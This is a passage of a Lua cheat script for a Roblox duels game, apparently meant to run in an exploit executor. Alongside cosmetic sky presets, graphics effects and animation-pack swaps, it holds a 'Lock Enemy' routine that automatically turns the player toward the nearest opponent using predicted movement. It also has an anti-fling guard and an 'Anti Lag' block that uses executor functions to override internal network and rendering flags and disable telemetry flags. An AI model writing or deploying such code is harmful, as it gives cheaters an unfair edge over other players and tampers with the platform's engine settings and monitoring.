    ["Off"]={kind="off"},
    ["Night"]={clock=22,brightness=2,ambient={110,100,130},outAmb={120,110,140},sky={stars=4000,moon=18,sun=0,moonTex=true},atm={dens=0.45,color={120,60,180},decay={60,20,100},glare=0.5,haze=1.2}},
    ["Aurora"]={clock=14,brightness=3,ambient={150,120,150},outAmb={160,130,150},atm={dens=0.55,color={255,80,200},decay={255,20,150},glare=2.5,haze=3},clouds={cover=0.7,dens=0.7,color={255,240,250}}},
    ["Sunset"]={clock=17.2,brightness=2.5,ambient={170,120,100},outAmb={180,130,110},sky={stars=0,sun=25,moon=0},atm={dens=0.5,color={255,130,60},decay={255,80,30},glare=2,haze=2.5},clouds={cover=0.55,dens=0.55,color={255,200,140}}},
    ["Galaxy"]={clock=0,brightness=1.5,ambient={70,60,100},outAmb={80,70,110},sky={stars=10000,moon=30,sun=0},atm={dens=0.15,color={40,20,80},decay={20,10,50},glare=0.3,haze=0.5}},
    ["Cyber"]={clock=21,brightness=2.2,ambient={90,130,170},outAmb={100,140,180},sky={stars=2000,moon=12},atm={dens=0.4,color={0,200,255},decay={150,0,255},glare=2,haze=2},clouds={cover=0.4,dens=0.6,color={100,200,255}}},
    ["Sakura"]={clock=11,brightness=3.5,ambient={170,150,160},outAmb={180,160,170},sky={sun=8},atm={dens=0.3,color={255,200,220},decay={255,170,200},glare=1,haze=1.5},clouds={cover=0.6,dens=0.4,color={255,250,252}}},
    ["Pink Night"]={clock=23,brightness=2.2,ambient={120,60,110},outAmb={140,70,120},sky={stars=5000,moon=22,sun=0,moonTex=true},atm={dens=0.5,color={255,80,180},decay={140,30,100},glare=0.7,haze=1.4},clouds={cover=0.3,dens=0.5,color={180,90,150}}},
    ["Blood Moon"]={clock=22.5,brightness=1.6,ambient={130,40,40},outAmb={150,50,50},sky={stars=1500,moon=28,sun=0,moonTex=true},atm={dens=0.6,color={220,30,30},decay={120,10,10},glare=1.4,haze=2},clouds={cover=0.5,dens=0.7,color={120,30,30}}},
    ["Emerald Dawn"]={clock=6.5,brightness=2.8,ambient={130,170,140},outAmb={140,180,150},sky={sun=18,moon=0,stars=0},atm={dens=0.4,color={80,200,140},decay={40,150,90},glare=1.8,haze=2.2},clouds={cover=0.5,dens=0.5,color={200,255,220}}},
    ["Volcanic"]={clock=19,brightness=2,ambient={180,80,40},outAmb={200,90,50},sky={stars=200,sun=12,moon=0},atm={dens=0.75,color={255,60,0},decay={180,20,0},glare=3,haze=3.5},clouds={cover=0.8,dens=0.9,color={120,40,20}}},
    ["Arctic"]={clock=9,brightness=3.2,ambient={200,220,235},outAmb={210,230,245},sky={sun=10,stars=0,moon=0},atm={dens=0.3,color={180,220,255},decay={140,200,240},glare=1.5,haze=1.8},clouds={cover=0.7,dens=0.6,color={250,253,255}}},
    ["Midnight Ocean"]={clock=1.5,brightness=1.7,ambient={60,90,130},outAmb={70,100,140},sky={stars=6000,moon=24,sun=0,moonTex=true},atm={dens=0.5,color={20,60,140},decay={10,30,90},glare=0.6,haze=1.5}},
    ["Vaporwave"]={clock=19.5,brightness=2.4,ambient={180,120,200},outAmb={190,130,210},sky={stars=1000,moon=14},atm={dens=0.45,color={255,100,220},decay={120,60,255},glare=2.2,haze=2.4},clouds={cover=0.55,dens=0.55,color={200,150,255}}},
    ["Toxic"]={clock=13,brightness=2.5,ambient={140,180,80},outAmb={150,190,90},atm={dens=0.55,color={100,220,40},decay={60,150,20},glare=1.8,haze=2.6},clouds={cover=0.65,dens=0.7,color={180,255,120}}},
    ["Solar Eclipse"]={clock=12,brightness=0.9,ambient={50,40,60},outAmb={60,50,70},sky={stars=3500,sun=22,moon=0},atm={dens=0.5,color={255,140,40},decay={30,20,40},glare=2.8,haze=1.8}},
    ["Hellscape"]={clock=18,brightness=1.8,ambient={200,60,30},outAmb={220,70,40},sky={stars=100,sun=30,moon=0},atm={dens=0.85,color={255,30,0},decay={120,0,0},glare=3.5,haze=4},clouds={cover=0.95,dens=0.95,color={80,20,10}}},
    ["Heaven"]={clock=12,brightness=4,ambient={240,235,210},outAmb={250,245,220},sky={sun=16,moon=0,stars=0},atm={dens=0.25,color={255,250,220},decay={255,240,200},glare=3,haze=1.5},clouds={cover=0.85,dens=0.5,color={255,255,255}}},
    ["Storm"]={clock=15,brightness=1.4,ambient={90,90,110},outAmb={100,100,120},sky={stars=0,sun=6,moon=0},atm={dens=0.65,color={80,90,120},decay={40,50,80},glare=0.5,haze=3},clouds={cover=0.95,dens=0.95,color={60,65,80}}},
    ["Sunrise"]={clock=6.2,brightness=2.8,ambient={220,180,130},outAmb={230,190,140},sky={sun=22,stars=0,moon=0},atm={dens=0.45,color={255,180,100},decay={255,140,80},glare=2.4,haze=2.2},clouds={cover=0.4,dens=0.4,color={255,220,180}}},
    ["Deep Space"]={clock=0,brightness=1,ambient={30,25,50},outAmb={40,35,60},sky={stars=15000,moon=0,sun=0},atm={dens=0.08,color={15,5,40},decay={5,0,20},glare=0.2,haze=0.3}},
    ["Lavender Dream"]={clock=18.5,brightness=2.6,ambient={180,160,220},outAmb={190,170,230},sky={stars=800,moon=16,sun=0},atm={dens=0.4,color={200,160,255},decay={160,120,220},glare=1.4,haze=1.8},clouds={cover=0.55,dens=0.5,color={220,200,255}}},
    ["Inferno"]={clock=17.5,brightness=2.2,ambient={220,100,40},outAmb={235,110,50},sky={sun=26,moon=0,stars=0},atm={dens=0.6,color={255,90,20},decay={200,40,0},glare=3,haze=3.2},clouds={cover=0.7,dens=0.7,color={200,80,40}}},
    ["Mint Sky"]={clock=10,brightness=3.2,ambient={180,230,210},outAmb={190,240,220},sky={sun=10},atm={dens=0.32,color={150,255,210},decay={100,220,180},glare=1.6,haze=1.6},clouds={cover=0.55,dens=0.45,color={240,255,250}}},
}

local function _vC3(t) return Color3.fromRGB(t[1], t[2], t[3]) end

local function _v4mpClearSky()
    for _, child in ipairs(Lighting:GetChildren()) do
        if child:GetAttribute("_AdaptDuelsSky") then
            pcall(function() child:Destroy() end)
        end
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if terrain then
        for _, child in ipairs(terrain:GetChildren()) do
            if child:GetAttribute("_AdaptDuelsSky") then
                pcall(function() child:Destroy() end)
            end
        end
    end
end

local function applyCustomSky(mode)
    _v4mpClearSky()
    local preset = SKY_PRESETS[mode]
    if not preset or preset.kind == "off" then
        Lighting.ClockTime = 14
        Lighting.Brightness = 2
        Lighting.OutdoorAmbient = Color3.fromRGB(127,127,127)
        Lighting.Ambient = Color3.fromRGB(127,127,127)
        Lighting.FogEnd = 100000
        Lighting.GlobalShadows = true
        S.skyTheme = "Off"
        return
    end
    Lighting.FogStart = 0
    Lighting.FogEnd = 100000
    Lighting.FogColor = Color3.fromRGB(200,200,200)
    Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
    Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
    Lighting.GlobalShadows = true
    Lighting.ClockTime = preset.clock or 14
    Lighting.Brightness = preset.brightness or 2
    if preset.outAmb then Lighting.OutdoorAmbient = _vC3(preset.outAmb) end
    if preset.ambient then Lighting.Ambient = _vC3(preset.ambient) end
    if preset.sky then
        local skyInst = Instance.new("Sky")
        skyInst:SetAttribute("_AdaptDuelsSky", true)
        if preset.sky.stars then skyInst.StarCount = preset.sky.stars end
        if preset.sky.moon then skyInst.MoonAngularSize = preset.sky.moon end
        if preset.sky.sun then skyInst.SunAngularSize = preset.sky.sun end
        if preset.sky.moonTex then skyInst.MoonTextureId = "rbxasset://sky/moon.jpg" end
        skyInst.Parent = Lighting
    end
    if preset.atm then
        local atm = Instance.new("Atmosphere")
        atm:SetAttribute("_AdaptDuelsSky", true)
        atm.Density = preset.atm.dens or 0.3
        atm.Color = _vC3(preset.atm.color)
        atm.Decay = _vC3(preset.atm.decay)
        atm.Glare = preset.atm.glare or 1
        atm.Haze = preset.atm.haze or 1
        atm.Parent = Lighting
    end
    local terrain = workspace:FindFirstChildOfClass("Terrain")
    if preset.clouds and terrain then
        local clouds = Instance.new("Clouds")
        clouds:SetAttribute("_AdaptDuelsSky", true)
        clouds.Cover = preset.clouds.cover or 0.5
        clouds.Density = preset.clouds.dens or 0.5
        clouds.Color = _vC3(preset.clouds.color)
        clouds.Parent = terrain
    end
    S.skyTheme = mode
end

local function enableVividGraphics()
    if S.vividGraphicsEnabled and #S.vividEffects > 0 then return end
    S.vividGraphicsEnabled = true
    for _, eff in ipairs(S.vividEffects) do
        pcall(function() eff:Destroy() end)
    end
    S.vividEffects = {}
    local color = Instance.new("ColorCorrectionEffect")
    color.Parent = Lighting
    color.Saturation = 0.6; color.Contrast = 0.4; color.Brightness = 0.05
    color.TintColor = Color3.fromRGB(255, 240, 220)
    table.insert(S.vividEffects, color)
    local bloom = Instance.new("BloomEffect")
    bloom.Parent = Lighting
    bloom.Intensity = 0.8; bloom.Size = 24; bloom.Threshold = 1
    table.insert(S.vividEffects, bloom)
    local atmosphere = Instance.new("Atmosphere")
    atmosphere.Parent = Lighting
    atmosphere.Density = 0.3; atmosphere.Offset = 0.25
    atmosphere.Color = Color3.fromRGB(199, 199, 255)
    atmosphere.Decay = Color3.fromRGB(106, 112, 125)
    atmosphere.Glare = 0.2; atmosphere.Haze = 1
    table.insert(S.vividEffects, atmosphere)
    local sun = Instance.new("SunRaysEffect")
    sun.Parent = Lighting
    sun.Intensity = 0.2; sun.Spread = 0.8
    table.insert(S.vividEffects, sun)
    local dof = Instance.new("DepthOfFieldEffect")
    dof.Parent = Lighting
    dof.FocusDistance = 25; dof.InFocusRadius = 10
    dof.NearIntensity = 0.2; dof.FarIntensity = 0.4
    table.insert(S.vividEffects, dof)
    task.spawn(function()
        while S.vividGraphicsEnabled and color and color.Parent do
            color.Contrast = 0.35 + math.sin(tick() * 2) * 0.05
            task.wait(0.03)
        end
    end)
end

local function disableVividGraphics()
    S.vividGraphicsEnabled = false
    for _, eff in ipairs(S.vividEffects) do
        pcall(function() eff:Destroy() end)
    end
    S.vividEffects = {}
end

local function toggleVividGraphics(on)
    if on then enableVividGraphics() else disableVividGraphics() end
    saveConfig()
end


YF = {}
-- Yout-to-Vision ports: Anti Fling, Lock Enemy, Anim Pack, and Anti Lag.
-- Anti Fling and Lock Enemy, adapted to Vision's state and movement system.
YF.antiFlingState = {connection = nil, threshold = 80, spinThreshold = 40}
function YF.startAntiFling()
    S.antiFlingEnabled = true
    if YF.antiFlingState.connection then return end
    YF.antiFlingState.connection = RunService.Heartbeat:Connect(function()
        if not S.antiFlingEnabled then return end
        local character = LP.Character
        local root = character and character:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid and (humanoid.Health <= 0 or humanoid.SeatPart) then return end
        if S._youtResetInProgress or S.dropBrainrotActive or _G.IsDropping then return end
        if S.autoLeftEnabled or S.autoRightEnabled or S.batAimbotEnabled or S.bodyLockEnabled then return end
        local velocity = root.AssemblyLinearVelocity
        if Vector3.new(velocity.X, 0, velocity.Z).Magnitude > YF.antiFlingState.threshold then
            pcall(function()
                root.AssemblyLinearVelocity = Vector3.new(0, velocity.Y, 0)
                root.AssemblyAngularVelocity = Vector3.zero
            end)
            return
        end
        if root.AssemblyAngularVelocity.Magnitude > YF.antiFlingState.spinThreshold then
            pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
        end
    end)
end
function YF.stopAntiFling()
    S.antiFlingEnabled = false
    if YF.antiFlingState.connection then YF.antiFlingState.connection:Disconnect(); YF.antiFlingState.connection = nil end
end

function YF.getClosestTargetBody()
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local closest, minDistance = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP then
            local otherCharacter = player.Character
            local targetRoot = otherCharacter and otherCharacter:FindFirstChild("HumanoidRootPart")
            local targetHumanoid = otherCharacter and otherCharacter:FindFirstChildOfClass("Humanoid")
            if targetRoot and targetHumanoid and targetHumanoid.Health > 0 then
                local distance = (targetRoot.Position - root.Position).Magnitude
                if distance < minDistance then closest, minDistance = targetRoot, distance end
            end
        end
    end
    return closest
end

function YF.bodyLockTick()
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health <= 0 then return end
    if S._youtResetInProgress or S.dropBrainrotActive or S.autoLeftEnabled or S.autoRightEnabled or S.batAimbotEnabled then
        if not humanoid.AutoRotate then humanoid.AutoRotate = true end
        return
    end
    local target = YF.getClosestTargetBody()
    if not target or (target.Position - root.Position).Magnitude > S.bodyLockRange then
        if not humanoid.AutoRotate then humanoid.AutoRotate = true end
        return
    end
    if humanoid.AutoRotate then humanoid.AutoRotate = false end
    local targetVelocity = target.AssemblyLinearVelocity
    local predictTime = math.clamp(targetVelocity.Magnitude / 80, 0.08, 0.35)
    local predictedPosition = target.Position + targetVelocity * predictTime
    local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
    local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
    local myHeight = root.Position.Y + (humanoid.HipHeight or 0)
    local verticalCorrection = math.clamp((targetHeight - myHeight) * 0.15, -1.5, 1.5)
    local lookPosition = Vector3.new(predictedPosition.X, root.Position.Y + verticalCorrection, predictedPosition.Z)
    if (lookPosition - root.Position).Magnitude > 0.1 then
        local goal = CFrame.lookAt(root.Position, lookPosition)
        local relative = root.CFrame:Inverse() * goal
        local _, yaw = relative:ToEulerAnglesXYZ()
        yaw = math.clamp(yaw, -2.5, 2.5)
        root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(0, yaw * 42, 0))
    end
end
function YF.startBodyLock()
    S.bodyLockEnabled = true
    if S.bodyLockConnection then return end
    local accumulator = 0
    S.bodyLockConnection = RunService.Heartbeat:Connect(function(dt)
        if not S.bodyLockEnabled then return end
        accumulator = accumulator + dt
        if accumulator < 0.033 then return end
        accumulator = 0
        YF.bodyLockTick()
    end)
end
function YF.stopBodyLock()
    S.bodyLockEnabled = false
    if S.bodyLockConnection then S.bodyLockConnection:Disconnect(); S.bodyLockConnection = nil end
    local character = LP.Character
    local root = character and character:FindFirstChild("HumanoidRootPart")
    if root then pcall(function() root.AssemblyAngularVelocity = Vector3.zero end) end
    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
    if humanoid then humanoid.AutoRotate = true end
end

YF.ANIM_PACKS = {
    ["Zombie"] = { idle1="rbxassetid://616158929", idle2="rbxassetid://616160636", walk="rbxassetid://616168032", run="rbxassetid://616163682", jump="rbxassetid://616161997", fall="rbxassetid://616157476", climb="rbxassetid://616156119", swim="rbxassetid://616165109", swimidle="rbxassetid://616166655" },
    ["Ninja"] = { idle1="rbxassetid://656117400", idle2="rbxassetid://656117400", walk="rbxassetid://656121766", run="rbxassetid://656118852", jump="rbxassetid://656117878", fall="rbxassetid://656115606", climb="rbxassetid://656114359", swim="rbxassetid://656117400", swimidle="rbxassetid://656117400" },
    ["Knight"] = { idle1="rbxassetid://657595757", idle2="rbxassetid://657595757", walk="rbxassetid://657552124", run="rbxassetid://657564596", jump="rbxassetid://658409194", fall="rbxassetid://657600338", climb="rbxassetid://658360781", swim="rbxassetid://657595757", swimidle="rbxassetid://657595757" },
    ["Elder"] = { idle1="rbxassetid://845397899", idle2="rbxassetid://845397899", walk="rbxassetid://845403856", run="rbxassetid://845386501", jump="rbxassetid://845398858", fall="rbxassetid://845397673", climb="rbxassetid://845392038", swim="rbxassetid://845397899", swimidle="rbxassetid://845397899" },
    ["Levitate"] = { idle1="rbxassetid://616006778", idle2="rbxassetid://616006778", walk="rbxassetid://616013216", run="rbxassetid://616013216", jump="rbxassetid://616008936", fall="rbxassetid://616005863", climb="rbxassetid://616003713", swim="rbxassetid://616006778", swimidle="rbxassetid://616006778" },
    ["Astronaut"] = { idle1="rbxassetid://891621366", idle2="rbxassetid://891621366", walk="rbxassetid://891636393", run="rbxassetid://891636393", jump="rbxassetid://891627522", fall="rbxassetid://891617961", climb="rbxassetid://891609353", swim="rbxassetid://891621366", swimidle="rbxassetid://891621366" },
    ["Pirate"] = { idle1="rbxassetid://750781874", idle2="rbxassetid://750781874", walk="rbxassetid://750785693", run="rbxassetid://750783738", jump="rbxassetid://750782230", fall="rbxassetid://750780242", climb="rbxassetid://750779899", swim="rbxassetid://750781874", swimidle="rbxassetid://750781874" },
    ["Toy"] = { idle1="rbxassetid://782841498", idle2="rbxassetid://782841498", walk="rbxassetid://782843345", run="rbxassetid://782842708", jump="rbxassetid://782847020", fall="rbxassetid://782846423", climb="rbxassetid://782843869", swim="rbxassetid://782841498", swimidle="rbxassetid://782841498" },
    ["Vampire"] = { idle1="rbxassetid://1083445855", idle2="rbxassetid://1083445855", walk="rbxassetid://1083473930", run="rbxassetid://1083462077", jump="rbxassetid://1083455352", fall="rbxassetid://1083443587", climb="rbxassetid://1083439238", swim="rbxassetid://1083445855", swimidle="rbxassetid://1083445855" },
    ["Werewolf"] = { idle1="rbxassetid://1083195517", idle2="rbxassetid://1083195517", walk="rbxassetid://1083178339", run="rbxassetid://1083216690", jump="rbxassetid://1083218792", fall="rbxassetid://1083189019", climb="rbxassetid://1083182000", swim="rbxassetid://1083195517", swimidle="rbxassetid://1083195517" },
    ["Rthro"] = { idle1="rbxassetid://2510196951", idle2="rbxassetid://2510196951", walk="rbxassetid://2510202577", run="rbxassetid://2510198475", jump="rbxassetid://2510197830", fall="rbxassetid://2510195892", climb="rbxassetid://2510192778", swim="rbxassetid://2510196951", swimidle="rbxassetid://2510196951" },
    ["Stylish"] = { idle1="rbxassetid://616136790", idle2="rbxassetid://616136790", walk="rbxassetid://616146177", run="rbxassetid://616140816", jump="rbxassetid://616139451", fall="rbxassetid://616134815", climb="rbxassetid://616133594", swim="rbxassetid://616136790", swimidle="rbxassetid://616136790" },
}

YF.ANIM_PACK_ORDER = {{"Off", "Off"}, {"Zombie", "Zombie"}, {"Ninja", "Ninja"}, {"Knight", "Knight"}, {"Elder", "Elder"}, {"Levitate", "Levitate"}, {"Astronaut", "Astronaut"}, {"Pirate", "Pirate"}, {"Toy", "Toy"}, {"Vampire", "Vampire"}, {"Werewolf", "Werewolf"}, {"Rthro", "Rthro"}, {"Stylish", "Stylish"}}

function YF.isPackAnim(id)
    for _, pack in pairs(YF.ANIM_PACKS) do
        for _, v in pairs(pack) do
            if v == id then return true end
        end
    end
    return false
end

function YF.saveOriginalAnims(char)
    local animate = char:FindFirstChild("Animate")
    if not animate then return end
    local function g(obj) return obj and obj.AnimationId or nil end
    local ids = {
        idle1 = g(animate.idle and animate.idle.Animation1),
        idle2 = g(animate.idle and animate.idle.Animation2),
        walk  = g(animate.walk and animate.walk.WalkAnim),
        run   = g(animate.run  and animate.run.RunAnim),
        jump  = g(animate.jump and animate.jump.JumpAnim),
        fall  = g(animate.fall and animate.fall.FallAnim),
        climb = g(animate.climb and animate.climb.ClimbAnim),
        swim  = g(animate.swim and animate.swim.Swim),
        swimidle = g(animate.swimidle and animate.swimidle.SwimIdle),
    }
    if not YF.isPackAnim(ids.walk) then S.originalAnimPack = ids end
end

function YF.applyAnimPack(packName)
    S.currentAnimPack = packName
    if S.animSelectorLabel then S.animSelectorLabel.Text = packName end
    if packName == "Off" then
        if S.originalAnimPack and LP.Character then
            local animate = LP.Character:FindFirstChild("Animate")
            if animate then
                local function s(obj,id) if obj and id then obj.AnimationId = id end end
                s(animate.idle and animate.idle.Animation1, S.originalAnimPack.idle1)
                s(animate.idle and animate.idle.Animation2, S.originalAnimPack.idle2)
                s(animate.walk and animate.walk.WalkAnim, S.originalAnimPack.walk)
                s(animate.run  and animate.run.RunAnim,   S.originalAnimPack.run)
                s(animate.jump and animate.jump.JumpAnim, S.originalAnimPack.jump)
                s(animate.fall and animate.fall.FallAnim, S.originalAnimPack.fall)
                s(animate.climb and animate.climb.ClimbAnim, S.originalAnimPack.climb)
                s(animate.swim and animate.swim.Swim, S.originalAnimPack.swim)
                s(animate.swimidle and animate.swimidle.SwimIdle, S.originalAnimPack.swimidle)
            end
        end
        if S.animPackConnection then S.animPackConnection:Disconnect(); S.animPackConnection = nil end
        return
    end
    local pack = YF.ANIM_PACKS[packName]
    if not pack then return end
    if S.animPackConnection then S.animPackConnection:Disconnect() end
    local observedCharacter, capturedCharacter = nil, nil
    S.animPackConnection = RunService.Heartbeat:Connect(function()
        local c = LP.Character
        if not c then return end
        if c ~= observedCharacter then observedCharacter, capturedCharacter = c, nil end
        local animate = c:FindFirstChild("Animate")
        if not animate then return end
        if capturedCharacter ~= c then
            YF.saveOriginalAnims(c)
            capturedCharacter = c
        end
        if not animate then return end
        local function s(obj,id) if obj and id then obj.AnimationId = id end end
        s(animate.idle and animate.idle.Animation1, pack.idle1)
        s(animate.idle and animate.idle.Animation2, pack.idle2)
        s(animate.walk and animate.walk.WalkAnim, pack.walk)
        s(animate.run  and animate.run.RunAnim,   pack.run)
        s(animate.jump and animate.jump.JumpAnim, pack.jump)
        s(animate.fall and animate.fall.FallAnim, pack.fall)
        s(animate.climb and animate.climb.ClimbAnim, pack.climb)
        s(animate.swim and animate.swim.Swim, pack.swim)
        s(animate.swimidle and animate.swimidle.SwimIdle, pack.swimidle)
    end)
end

function YF.startAnimPack(packName)
    local char = LP.Character
    if char then
        YF.saveOriginalAnims(char)
        YF.applyAnimPack(packName)
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            for _, track in ipairs(hum:GetPlayingAnimationTracks()) do track:Stop(0) end
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end
    else
        YF.applyAnimPack(packName)
    end
    S.currentAnimPack = packName
end

function YF.stopAnimPack()
    S.currentAnimPack = "Off"
    if S.animSelectorLabel then S.animSelectorLabel.Text = "Off" end
    YF.applyAnimPack("Off")
end

YF._alSaved = setmetatable({}, { __mode = "k" })
YF._alDetached = {}
YF._alAnimators = setmetatable({}, { __mode = "k" })
YF._alStoppedTracks = setmetatable({}, { __mode = "k" })
YF._alGeneration = 0
YF._alScanCancel = nil
YF._alConns = {}
YF._alLightOrig = nil
YF._alWorldOrig = {}
YF._alFlagOriginals = {}
YF._alRunning = false

YF.AL_LOW_FLAGS = {
    {"DFIntClusterSenderMaxJoinBandwidthBps", "2100000000"},
    {"DFIntClusterSenderMaxUpdateBandwidthBps", "2100000000"},
    {"DFIntServerFramesBetweenJoins", "1"},
    {"DFIntRaknetBandwidthInfluxHundredthsPercentageV2", "10000"},
    {"DFIntConnectionMTUSize", "1400"},
    {"FIntRakNetResendBufferArrayLength", "1024"},
    {"DFIntRakNetNakResendDelayMsMax", "1"},
    {"DFIntWaitOnUpdateNetworkLoopEndedMS", "100"},
    {"DFIntWaitOnRecvFromLoopEndedMS", "100"},
    {"DFIntLargePacketQueueSizeCutoffMB", "1000"},
    {"DFIntSendRakNetStatsInterval", "2147483647"},
    {"DFIntRakNetLoopMs", "1"},
    {"DFIntRakNetSelectTimeoutMs", "1"},
    {"DFIntNetworkClusterPacketCacheNumParallelTasks", "8"},
    {"DFIntReplicationDataCacheNumParallelTasks", "8"},
    {"DFIntMegaReplicatorNumParallelTasks", "16"},
    {"DFIntMaxProcessPacketsStepsPerCyclic", "512"},
    {"DFIntMaxProcessPacketsStepsAccumulated", "0"},
    {"DFIntMaxProcessPacketsJobScaling", "1000"},
    {"DFIntClientPacketMaxFrameMicroseconds", "200000"},
    {"DFIntClientPacketExcessMicroseconds", "10000"},
    {"DFIntClientPacketMinMicroseconds", "1"},
    {"DFIntClientPacketMaxDelayMs", "1"},
    {"DFIntMaxWaitTimeBeforeForcePacketProcessMS", "1"},
    {"DFIntMaxFrameBufferSize", "4"},
    {"DFIntBufferCompressionThreshold", "100"},
    {"DFIntOverrideISRReplicatorStepBandwidthBytes", "131072"},
    {"DFIntTaskSchedulerJobInitThreads", "8"},
    {"DFIntTaskSchedulerJobInGameThreads", "8"},
    {"FIntTaskSchedulerAutoThreadLimit", "16"},
    {"FIntTaskSchedulerAsyncTasksMinimumThreadCount", "4"},
    {"DFIntRuntimeConcurrency", "16"},
    {"FIntSimWorldTaskQueueParallelTasks", "20"},
    {"DFIntHttpBatchLimit", "256"},
    {"FIntHttpBatchLimit", "256"},
    {"DFIntHttpCurlConnectionCacheSize", "512"},
    {"FIntDefaultMeshCacheSizeMB", "512"},
    {"DFIntMemCacheMaxCapacityMB", "256"},
    {"DFIntNumAssetsMaxToPreload", "1"},
    {"DFFlagEnableSoundPreloading", "false"},
    {"FFlagSlimContentProvider", "true"},
    {"DFFlagDebugSkipMeshVoxelizer", "true"},
    {"DFFlagTextureQualityOverrideEnabled", "true"},
    {"DFIntTextureQualityOverride", "0"},
    {"FIntDebugTextureManagerSkipMips", "7"},
    {"DFIntDebugLimitMinTextureResolutionWhenSkipMips", "8"},
    {"FFlagTM2SkipMipsForUnstreamable2", "true"},
    {"DFFlagDoNotSkipMipsBasedOnSystemMemoryPS", "true"},
    {"FFlagRenderUseTextureManager224", "false"},
    {"DFIntDebugFRMQualityLevelOverride", "1"},
    {"DFFlagDebugPauseVoxelizer", "true"},
    {"FFlagFastGPULightCulling3", "true"},
    {"FIntRenderLocalLightFadeInMs", "0"},
    {"FIntRenderLocalLightUpdatesMax", "1"},
    {"FIntRenderShadowmapBias", "0"},
    {"FIntSSAOMipLevels", "0"},
    {"FIntDebugForceMSAASamples", "1"},
    {"FIntDebugFRMOptionalMSAALevelOverride", "0"},
    {"FIntRobloxGuiBlurIntensity", "0"},
    {"FIntFRMMinGrassDistance", "0"},
    {"FIntFRMMaxGrassDistance", "0"},
    {"DFFlagCoreScriptTelemetry2", "false"},
    {"DFFlagBrowserTrackerIdTelemetryEnabled", "false"},
    {"FFlagPerfDataOnTelemetryV2", "false"},
    {"FFlagSendRenderFidelityTelemetry2", "false"},
    {"FFlagEnableTelemetryServiceMemoryCPUInfo", "false"},
    {"DFIntTelemetryProfilerHundredthsPercentage", "0"},
    {"FIntTelemetryProfilerFrequency", "0"},
    {"FIntPerformanceTelemetryQueueProcessLimit", "0"},
    {"DFIntContentProviderPreloadHangTelemetryHundredthsPercentage", "0"},
}

function YF._alApplyLowFlags()
    local env = (getgenv and getgenv()) or _G
    local setter = rawget(env, "setfflag") or rawget(_G, "set_fflag")
    local getter = rawget(env, "getfflag") or rawget(_G, "get_fflag")
    -- Only change flags when the original values can also be queried and restored.
    if type(setter) ~= "function" or type(getter) ~= "function" then return end
    for _, flag in ipairs(YF.AL_LOW_FLAGS) do
        local ok, current = pcall(getter, flag[1])
        if ok and current ~= nil then
            if YF._alFlagOriginals[flag[1]] == nil then
                YF._alFlagOriginals[flag[1]] = tostring(current)
            end
            pcall(setter, flag[1], tostring(flag[2]))
        end
    end
end

function YF._alSaveLighting()
    if YF._alLightOrig then return end
    YF._alLightOrig = {
        Brightness = Lighting.Brightness,
        ClockTime = Lighting.ClockTime,
        OutdoorAmbient = Lighting.OutdoorAmbient,
        Ambient = Lighting.Ambient,
        GlobalShadows = Lighting.GlobalShadows,
        EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
        EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
        FogStart = Lighting.FogStart,
        FogEnd = Lighting.FogEnd,
    }
end

function YF._alApplyLowPermanentSettings()
    if next(YF._alWorldOrig) == nil then
        pcall(function() YF._alWorldOrig.renderQuality = settings().Rendering.QualityLevel end)
        pcall(function() YF._alWorldOrig.savedQuality = UserSettings():GetService("UserGameSettings").SavedQualityLevel end)
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            YF._alWorldOrig.terrainObject = terrain
            YF._alWorldOrig.terrain = {
                Decoration = terrain.Decoration, WaterWaveSize = terrain.WaterWaveSize,
                WaterWaveSpeed = terrain.WaterWaveSpeed, WaterReflectance = terrain.WaterReflectance,
                WaterTransparency = terrain.WaterTransparency,
            }
            local clouds = terrain:FindFirstChildOfClass("Clouds")
            if clouds then YF._alWorldOrig.cloudsObject = clouds; YF._alWorldOrig.cloudsEnabled = clouds.Enabled end
        end
        YF._alWorldOrig.atmospheres = {}
        for _, atmosphere in ipairs(Lighting:GetChildren()) do
            if atmosphere:IsA("Atmosphere") then
                YF._alWorldOrig.atmospheres[atmosphere] = {
                    Density = atmosphere.Density, Glare = atmosphere.Glare, Haze = atmosphere.Haze,
                }
            end
        end
    end
    pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
    pcall(function()
        UserSettings():GetService("UserGameSettings").SavedQualityLevel = Enum.SavedQualitySetting.QualityLevel1
    end)
    pcall(function()
        Lighting.GlobalShadows = false
        Lighting.EnvironmentDiffuseScale = 0
        Lighting.EnvironmentSpecularScale = 0
        Lighting.FogStart = 0
        Lighting.FogEnd = 1e10
    end)
    pcall(function()
        local atmosphere = Lighting:FindFirstChildOfClass("Atmosphere")
        if atmosphere then
            atmosphere.Density = 0
            atmosphere.Glare = 0
            atmosphere.Haze = 0
        end
    end)
    pcall(function()
        local terrain = workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            terrain.Decoration = false
            terrain.WaterWaveSize = 0
            terrain.WaterWaveSpeed = 0
            terrain.WaterReflectance = 0
            local clouds = terrain:FindFirstChildOfClass("Clouds")
            if clouds then clouds.Enabled = false end
        end
    end)
end

function YF._alChange(object, property, value)
    pcall(function()
        local original = object[property]
        if original == value then return end
        object[property] = value
        local bucket = YF._alSaved[object]
        if not bucket then bucket = {}; YF._alSaved[object] = bucket end
        if not bucket[property] then bucket[property] = { value = original } end
    end)
end

function YF._alIsProtectedVisual(object)
    local char = LP.Character
    if char and (object == char or object:IsDescendantOf(char)) then return true end
    if object:GetAttribute("_AdaptDuelsSky") then return true end
